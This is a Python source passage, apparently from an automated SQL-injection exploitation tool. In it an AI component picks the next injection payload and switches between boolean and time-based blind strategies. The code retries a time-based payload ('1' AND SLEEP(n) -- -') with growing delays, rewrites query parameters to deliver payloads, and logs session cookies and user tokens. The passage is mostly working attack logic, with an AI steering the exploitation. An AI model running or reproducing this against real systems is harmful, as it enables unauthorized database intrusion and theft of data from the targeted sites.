                root_cause="candidate_not_confirmed",
                confidence=confidence,
                actions=[
                    PatchAction(
                        type="mutate_step_query_param",
                        value={
                            "step_id": candidate_step,
                            "param": param,
                            "new_value": next_payload,
                        },
                    ),
                    PatchAction(type="goto_step_id", value=candidate_step),
                ],
                explanation=f"AI chose {next_strategy}: {explanation}",
                metadata={
                    "candidates": candidates,
                    "current_payload": current_payload,
                    "target_step_id": candidate_step,
                    "target_param": param,
                    "strategy": next_strategy,
                },
            )

        if failure == "boolean_no_difference":
            observation = self._build_ai_observation(
                state,
                web,
                allowed_strategies=["SWITCH_BOOLEAN", "SWITCH_TIME"],
            )

            ai_result = analyze_poc(observation)
            analysis = (ai_result or {}).get("analysis", {})

            next_strategy = analysis.get("next_strategy", "SWITCH_TIME")
            current_payload = self._get_payload_from_path(web.get("path", ""), "id")
            next_payload = str(analysis.get("next_payload") or current_payload or "").strip()
            candidates = analysis.get("candidates") or ([next_payload] if next_payload else [])
            explanation = analysis.get("explanation") or "AI chose next payload."
            confidence = float(analysis.get("confidence", 0.5) or 0.5)

            if next_strategy == "SWITCH_TIME":
                state["strategy_used"] = "SWITCH_TIME"
                state["time_probe_active"] = True
                state["time_probe_attempts"] = 0
                state["time_probe_confirmations"] = 0
                state["time_probe_sleep"] = 5
                state["time_probe_step_id"] = step_id

                bd = (self.spec.get("success") or {}).get("boolean_diff") or {}
                state["time_probe_baseline_step"] = bd.get("baseline_step", "sqli_baseline")
                state["verified_exploit_payload"] = next_payload
                state["ai_reason"] = explanation or "AI repair selected"
                state["used_memory_case"] = analysis.get("used_memory_case")
                state["memory_match_reason"] = analysis.get("memory_match_reason")
                

                return PatchPlan(
                    root_cause="boolean_no_difference",
                    confidence=confidence,
                    actions=[
                        PatchAction(
                            type="mutate_step_query_param",
                            value={
                                "step_id": step_id,
                                "param": "id",
                                "new_value": next_payload,
                            },
                        ),
                        PatchAction(type="retest", value=None),
                    ],
                    explanation=f"AI chose SWITCH_TIME: {explanation}",
                    metadata={
                        "candidates": candidates,
                        "current_payload": current_payload,
                        "target_step_id": step_id,
                        "target_param": "id",
                        "strategy": next_strategy,
                    },
                )

            if next_strategy == "SWITCH_BOOLEAN":
                state["strategy_used"] = "SWITCH_BOOLEAN"
                state["verified_exploit_payload"] = next_payload
                state["ai_reason"] = explanation or "AI repair selected"
                state["used_memory_case"] = analysis.get("used_memory_case")
                state["memory_match_reason"] = analysis.get("memory_match_reason")

                return PatchPlan(
                    root_cause="boolean_no_difference",
                    confidence=confidence,
                    actions=[
                        PatchAction(
                            type="mutate_step_query_param",
                            value={
                                "step_id": "sqli_candidate",
                                "param": "id",
                                "new_value": next_payload,
                            },
                        ),
                        PatchAction(type="goto_step_id", value="sqli_candidate"),
                    ],
                    explanation=f"AI chose SWITCH_BOOLEAN: {explanation}",
                    metadata={
                        "candidates": candidates,
                        "current_payload": current_payload,
                        "target_step_id": "sqli_candidate",
                        "target_param": "id",
                        "strategy": next_strategy,
                    },
                )

            state["strategy_used"] = "AI_NO_ACTION"
            return None

        if state.get("time_probe_active") and step_id == state.get("time_probe_step_id"):
            if failure == "time_probe_success":
                confirmations = int(state.get("time_probe_confirmations", 0))

                if confirmations < 1:
                    state["time_probe_confirmations"] = confirmations + 1
                    state["strategy_used"] = "TIME_CONFIRMATION_RETRY"

                    return PatchPlan(
                        root_cause="time_probe_confirmation",
                        confidence=0.80,
                        actions=[PatchAction(type="retest", value=None)],
                        explanation="first successful time probe → repeat once to confirm timing evidence",
                    )

                state["strategy_used"] = "TIME_CONFIRMED"
                return PatchPlan(
                    root_cause="time_probe_success",
                    confidence=0.99,
                    actions=[PatchAction(type="advance_step", value=None)],
                    explanation="repeated time probe worked → timing evidence confirmed",
                )

            attempts = int(state.get("time_probe_attempts", 0))
            if attempts < 3:
                attempts += 1
                state["time_probe_attempts"] = attempts
                sleep_s = int(state.get("time_probe_sleep", 5)) + 2
                state["time_probe_sleep"] = sleep_s
                payload = f"1' AND SLEEP({sleep_s}) -- -"

                state["strategy_used"] = "TIME_PROBE_RETRY"
                state["verified_exploit_payload"] = payload
                state["ai_reason"] = f"Retrying time probe with SLEEP({sleep_s})."

                return PatchPlan(
                    root_cause="time_probe_retry",
                    confidence=0.75,
                    actions=[
                        PatchAction(
                            type="mutate_step_query_param",
                            value={
                                "step_id": step_id,
                                "param": "id",
                                "new_value": payload,
                            },
                        ),
                        PatchAction(type="retest", value=None),
                    ],
                    explanation=f"time_probe_active → increase sleep to {sleep_s} and retest",
                )

            state["time_probe_active"] = False
            state["strategy_used"] = "TIME_PROBE_GIVE_UP"
            return None

        return PatchPlan(
            root_cause="deterministic",
            confidence=1.0,
            actions=[PatchAction(type="advance_step", value=None)],
            explanation="no actionable failure → advance_step",
        )


    def apply(self, plan: PatchPlan, state: Dict[str, Any]) -> Dict[str, Any]:
        steps = self.spec.get("steps", [])

        def _find_step_index(step_id: str) -> Optional[int]:
            for i, s in enumerate(steps):
                if s.get("id") == step_id:
                    return i
            return None

        for act in plan.actions:
            if act.type == "goto_step_id":
                target = str(act.value)
                idx = _find_step_index(target)
                if idx is not None:
                    state["step_index"] = idx

            elif act.type == "advance_step":
                state["step_index"] = int(state.get("step_index", 0)) + 1

            elif act.type == "retest":
                pass

            elif act.type == "mutate_step_query_param":
                v = act.value or {}
                target_step = v.get("step_id")
                param = v.get("param")
                new_value = v.get("new_value")
                if not (target_step and param and new_value):
                    continue

                for s in steps:
                    if s.get("id") == target_step:
                        old_path = s.get("path") or ""
                        s["path"] = _update_query_param_in_path(old_path, param, str(new_value))
                        break

        state["last_plan"] = {
            "root_cause": plan.root_cause,
            "confidence": plan.confidence,
            "actions": [{"type": a.type, "value": a.value} for a in plan.actions],
            "explanation": plan.explanation,
        }
        return state

    # ---------------------------
    # Logging
    # ---------------------------

    def _append_log(
        self,
        step_id: str,
        step_name: str,
        method: str,
        url: str,
        status: Optional[int],
        elapsed: float,
        err: Optional[str],
        auth_state: str,
        cookies: Dict[str, str],
        user_token: Optional[str],
        sec_level: Optional[str],
        failure_type: str,
        body: str,
    ) -> None:
        with open(self.raw_log_path, "a", encoding="utf-8", errors="ignore") as f:
            f.write(f"\n=== STEP {step_id} | {step_name} ===\n")
            f.write(f"METHOD: {method}\n")
            f.write(f"URL: {url}\n")
            f.write(f"STATUS: {status}\n")
            f.write(f"ELAPSED_S: {elapsed:.4f}\n")
            f.write(f"ERROR: {err or ''}\n")
            f.write(f"AUTH_STATE: {auth_state}\n")
            f.write(f"COOKIES: {cookies}\n")
            f.write(f"USER_TOKEN: {user_token or ''}\n")
            f.write(f"SECURITY_LEVEL: {sec_level or ''}\n")
            f.write(f"FAILURE_TYPE: {failure_type}\n")
            f.write("RESPONSE_START:\n\n")
            f.write(body or "")
            f.write("\nRESPONSE_END\n")
